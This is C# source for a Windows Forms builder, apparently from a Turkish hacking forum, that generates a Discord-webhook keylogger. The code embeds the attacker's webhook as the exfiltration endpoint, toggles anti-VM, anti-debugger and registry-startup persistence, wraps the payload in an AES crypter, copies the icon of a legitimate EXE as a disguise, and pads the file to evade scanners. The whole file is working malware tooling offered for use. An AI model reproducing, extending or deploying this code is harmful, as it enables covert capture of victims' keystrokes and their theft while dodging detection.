using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Runtime.Remoting.Metadata.W3cXsd2001;
using System.Reflection.Emit;
using Mono.Cecil;
using TsudaKageyu;
using System.Security.Cryptography;
using Microsoft.Win32;
using System.Threading;

/*
 * Projenin bazı kısımlarındaki kodlamanın
 * kötülüğü için kusura bakmayın proje fazla uzamaya başladı.
 */

namespace THT_Discord_Keylogger_Generator
{
    public partial class Form1 : Form
    {
        public static byte[] GetStringToBytes(string value)
        {
            SoapHexBinary shb = SoapHexBinary.Parse(value);
            return shb.Value;
        }
        private static string webhook_hex = new SoapHexBinary(Encoding.Unicode.GetBytes("https://discordapp.com/api/webhooks/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")).ToString();
        private static string buffer_treshold_hex = new SoapHexBinary(Encoding.Unicode.GetBytes("HCHG")).ToString();
        private static string anti_vm_hex = new SoapHexBinary(Encoding.Unicode.GetBytes("ANTIVM")).ToString();
        private static string anti_debugger_hex = new SoapHexBinary(Encoding.Unicode.GetBytes("ANTIDBG")).ToString();
        private static string startup_hex = new SoapHexBinary(Encoding.Unicode.GetBytes("SETSTRTUP")).ToString();

        private void PrintErrorToLog(RichTextBox tbox, string msg)
        {
            BeginInvoke(new Action(() =>
            {
                tbox.SelectionColor = Color.Red;
                tbox.AppendText("[HATA] ");
                tbox.SelectionColor = Color.Black;
                tbox.AppendText(msg);
                tbox.AppendText(Environment.NewLine);
            }));
        }
        private void PrintSuccessToLog(RichTextBox tbox, string msg)
        {
            BeginInvoke(new Action(() =>
            {
                tbox.SelectionColor = Color.Green;
                tbox.AppendText("[OK] ");
                tbox.SelectionColor = Color.Black;
                tbox.AppendText(msg);
                tbox.AppendText(Environment.NewLine);
            }));
        }
        private void PrintStatusToLog(RichTextBox tbox, string msg)
        {
            BeginInvoke(new Action(() =>
            {
                tbox.SelectionColor = Color.Blue;
                tbox.AppendText("[DURUM] ");
                tbox.SelectionColor = Color.Black;
                tbox.AppendText(msg);
                tbox.AppendText(Environment.NewLine);
            }));
        }

        private static byte nop = 00;
        private static void BumpStub(string filename, int mb)
        {
            using (var fileStream = new FileStream(filename, FileMode.Append, FileAccess.Write, FileShare.None))
            using (var bw = new BinaryWriter(fileStream))
            {
                for (int i = 0; i != (mb * 1048576); i++)
                {
                    bw.Write(nop);
                }
                bw.Close();
                fileStream.Close();
            }
        }
        public static byte[] ReplaceResource(byte[] data, string resourceName, byte[] resource)
        {
            var definition =
                AssemblyDefinition.ReadAssembly(new MemoryStream(data));

            for (var i = 0; i < definition.MainModule.Resources.Count; i++)
                if (definition.MainModule.Resources[i].Name == resourceName)
                {
                    definition.MainModule.Resources.RemoveAt(i);
                    break;
                }

            var er = new EmbeddedResource(resourceName, ManifestResourceAttributes.Public, resource);
            definition.MainModule.Resources.Add(er);
            var tmp = new MemoryStream();
            definition.Write(tmp);
            return tmp.ToArray();
        }

        public static MemoryStream GetResource(byte[] data, string resourceName)
        {
            var definition =
                AssemblyDefinition.ReadAssembly(new MemoryStream(data));

            foreach (var resource in definition.MainModule.Resources)
                if (resource.Name == resourceName)
                {
                    var embeddedResource = (EmbeddedResource)resource;
                    var stream = embeddedResource.GetResourceStream();

                    var bytes = new byte[stream.Length];
                    stream.Read(bytes, 0, bytes.Length);

                    var memStream = new MemoryStream();
                    memStream.Write(bytes, 0, bytes.Length);
                    memStream.Position = 0;
                    return memStream;
                }

            return null;
        }
        private static void GenerateStub(string output, bool vm, bool debugger, bool startup, int treshold, bool crypter, string key, string iv, bool crypter_vm, bool crypter_dbg, string webhook)
        {
            byte[] stub_data = Properties.Resources.THT_Discord_Keylogger;
            stub_data = ReplaceResource(stub_data, "webhook", Encoding.UTF8.GetBytes(webhook));
            stub_data = ReplaceResource(stub_data, "treshold", Encoding.UTF8.GetBytes(treshold.ToString()));

            if (vm)
            {
                stub_data = ReplaceResource(stub_data, "vm", Encoding.UTF8.GetBytes("1"));
            } else
            {
                stub_data = ReplaceResource(stub_data, "vm", Encoding.UTF8.GetBytes("0"));
            }

            if (debugger)
            {
                stub_data = ReplaceResource(stub_data, "dbg", Encoding.UTF8.GetBytes("1"));
            }
            else
            {
                stub_data = ReplaceResource(stub_data, "vm", Encoding.UTF8.GetBytes("0"));
            }

            if (startup)
            {
                stub_data = ReplaceResource(stub_data, "startup", Encoding.UTF8.GetBytes("1"));
            }
            else
            {
                stub_data = ReplaceResource(stub_data, "startup", Encoding.UTF8.GetBytes("0"));
            }

            if (!crypter)
            {
                File.WriteAllBytes(output, stub_data);
                return;
            }

            RijndaelManaged rijndael = new RijndaelManaged();
            Rfc2898DeriveBytes keyGenerator = new Rfc2898DeriveBytes(key, Encoding.UTF8.GetBytes(iv));
            ICryptoTransform encryptor = rijndael.CreateEncryptor(keyGenerator.GetBytes(32), keyGenerator.GetBytes(16));
            byte[] encrypted_stub = encryptor.TransformFinalBlock(stub_data, 0, stub_data.Length);

            byte[] crypter_data = THT_Discord_Keylogger_Generator.Properties.Resources.THT_Discord_Keylogger_Crypter;
            crypter_data = ReplaceResource(crypter_data, "key", Encoding.UTF8.GetBytes(key));
            crypter_data = ReplaceResource(crypter_data, "iv", Encoding.UTF8.GetBytes(iv));
            crypter_data = ReplaceResource(crypter_data, "stub", Encoding.UTF8.GetBytes(Convert.ToBase64String(encrypted_stub)));

            if (crypter_vm)
            {
                crypter_data = ReplaceResource(crypter_data, "vm", Encoding.UTF8.GetBytes("true"));
            } else
            {
                crypter_data = ReplaceResource(crypter_data, "vm", Encoding.UTF8.GetBytes("false"));
            }
            if (crypter_dbg)
            {
                crypter_data = ReplaceResource(crypter_data, "dbg", Encoding.UTF8.GetBytes("true"));
            } else
            {
                crypter_data = ReplaceResource(crypter_data, "dbg", Encoding.UTF8.GetBytes("false"));
            }

            File.WriteAllBytes(output, crypter_data);
            return;
        }
        public Form1()
        {
            InitializeComponent();
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
        }

        private static Random random = new Random();
        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            textBox3.Text = RandomString(32);
            textBox6.Text = RandomString(16);
            textBox4.Text = AppDomain.CurrentDomain.BaseDirectory;
            richTextBox1.SelectionColor = Color.Red;
            richTextBox1.AppendText(" [ Turk Hack Team Discord Keylogger | Yapımcı: Hichigo THT (Ar-Ge Tim) ]");
            richTextBox1.AppendText(Environment.NewLine);
            richTextBox1.AppendText(Environment.NewLine);
            richTextBox1.SelectionColor = Color.Black;
            PrintStatusToLog(richTextBox1, "Program başlatıldı!");
            PrintStatusToLog(richTextBox1, "Crypter anahtarları üretildi!");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            if (textBox1.Text.Length != 123)
            {
                label3.ForeColor = Color.Red;
                label3.Text = "Kullanılamaz ❌";
                return;
            }

            Uri tmp;
            if (Uri.TryCreate(textBox1.Text, UriKind.Absolute, out tmp)
                && (tmp.Scheme == Uri.UriSchemeHttp || tmp.Scheme == Uri.UriSchemeHttps))
            {
                label3.ForeColor = Color.Lime;
                label3.Text = "Kullanılabilir ✔️";
                return;
            }
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            richTextBox1.Clear();
            richTextBox1.SelectionColor = Color.Red;
            richTextBox1.AppendText(" [ Turk Hack Team Discord Keylogger | Yapımcı: Hichigo THT (Ar-Ge Tim) ]");
            richTextBox1.AppendText(Environment.NewLine);
            richTextBox1.AppendText(Environment.NewLine);
            richTextBox1.SelectionColor = Color.Black;
        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }

        private void checkBox4_CheckedChanged(object sender, EventArgs e)
        {

        }

        private string selected_icon;
        private void button3_Click(object sender, EventArgs e)
        {
            OpenFileDialog file = new OpenFileDialog();
            file.Filter = "İkon Dosyası |*.ico";  
            file.RestoreDirectory = true;
            file.CheckFileExists = true;
            file.Title = "İkon dosyası seçiniz..";
            file.Multiselect = false;

            if (file.ShowDialog() == DialogResult.OK)
            {
                selected_icon = file.FileName;
                pictureBox4.ImageLocation = selected_icon;
                selected_exe = null;
                selected_exe_icon = null;
                PrintSuccessToLog(richTextBox1, file.SafeFileName + " ikonu yüklendi!");
            }
        }

        private string selected_exe;
        private IconExtractor selected_exe_icon;
        private IconExtractor GetIcon(string path)
        {
            IconExtractor ie = new IconExtractor(path);
            return ie;
        }
        private void button4_Click(object sender, EventArgs e)
        {
            OpenFileDialog file = new OpenFileDialog();
            file.Filter = "EXE Dosyası |*.exe";
            file.RestoreDirectory = true;
            file.CheckFileExists = true;
            file.Title = "EXE dosyası seçiniz..";
            file.Multiselect = false;

            if (file.ShowDialog() == DialogResult.OK)
            {
                selected_exe = file.FileName;
                Bitmap icon = GetIcon(selected_exe).GetIcon(0).ToBitmap();
                if (icon != null)
                {
                    pictureBox4.Image = icon;
                    selected_exe_icon = GetIcon(selected_exe);
                    PrintSuccessToLog(richTextBox1, file.SafeFileName + " dosyasının ikonu çalındı!");
                    selected_icon = null;
                }
            }
        }

        private void button2_Click_1(object sender, EventArgs e)
        {
            if (label3.ForeColor == Color.Red)
            {
                PrintErrorToLog(richTextBox1, "Lütfen geçerli bir Discord Webhook'u girin!");
                button2.Enabled = true;
                return;
            }

            try
            {
                GenerateStub(
                    textBox4.Text + textBox5.Text,
                    checkBox2.Checked,
                    checkBox3.Checked,
                    checkBox1.Checked,
                    trackBar1.Value,
                    checkBox4.Checked,
                    textBox3.Text,
                    textBox6.Text,
                    checkBox6.Checked,
                    checkBox5.Checked,
                    textBox1.Text
                    );
            }
            catch
            {
                PrintErrorToLog(richTextBox1, "Dosya oluşturulurken hata oluştu!");
                button2.Enabled = true; ;
                return;
            }
            if (checkBox4.Checked)
            {
                PrintSuccessToLog(richTextBox1, textBox5.Text + " Dosyası şifrelendi!");
            }
            PrintSuccessToLog(richTextBox1, textBox5.Text + " Dosyası oluşturuldu!");


            if (selected_exe_icon != null)
            {
                try
                {
                    string s = System.IO.Path.GetTempPath() + Guid.NewGuid().ToString() + ".ico";
                    MemoryStream ms = new MemoryStream();
                    selected_exe_icon.Save(0, ms);
                    IconInjector.InjectIcon(textBox4.Text + textBox5.Text, ms.ToArray());
                    PrintSuccessToLog(richTextBox1, "Dosya ikonu değiştirildi!");
                    ms.Close();
                }
                catch
                {
                    PrintErrorToLog(richTextBox1, "Dosyaya ikon eklenirken hata oluştu!");
                    button2.Enabled = true;
                    return;
                }
            }

            if (selected_icon != null)
            {
                try
                {
                    IconInjector.InjectIcon(textBox4.Text + textBox5.Text, selected_icon);
                    PrintSuccessToLog(richTextBox1, "Dosya ikonu değiştirildi!");
                }
                catch
                {
                    PrintErrorToLog(richTextBox1, "Dosyaya ikon eklenirken hata oluştu!");
                    button2.Enabled = true;
                    return;
                }
            }

            if (trackBar2.Value != 0)
            {
                BumpStub(textBox4.Text + textBox5.Text, trackBar2.Value);
                PrintSuccessToLog(richTextBox1, "Dosyanın boyutu " + trackBar2.Value.ToString() + " MB arttırıldı!");
            }

            button2.Enabled = true;
            MessageBox.Show("Dosyanız oluşturuldu!",
                            "Başarılı!",
                            MessageBoxButtons.OK,
                            MessageBoxIcon.Exclamation,
                            MessageBoxDefaultButton.Button1
                            );
        }

        private void trackBar2_Scroll(object sender, EventArgs e)
        {
            textBox7.Text = trackBar2.Value.ToString() + " MB";
        }

        private void trackBar1_Scroll(object sender, EventArgs e)
        {
            textBox2.Text = trackBar1.Value.ToString() + " Karakter";
        }

        private void label13_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://www.turkhackteam.org/");
        }

        private void label14_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://www.instagram.com/hichigo.exe/");
        }

        private void button6_Click(object sender, EventArgs e)
        {
            try
            {
                RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                rk.DeleteValue("system32", false);
                PrintSuccessToLog(richTextBox1, "Keylogger bilgisayarınızdan kaldırıldı!");
            } catch
            {
                PrintErrorToLog(richTextBox1, "Keylogger bulunamadı!");
            }
        }
    }
}
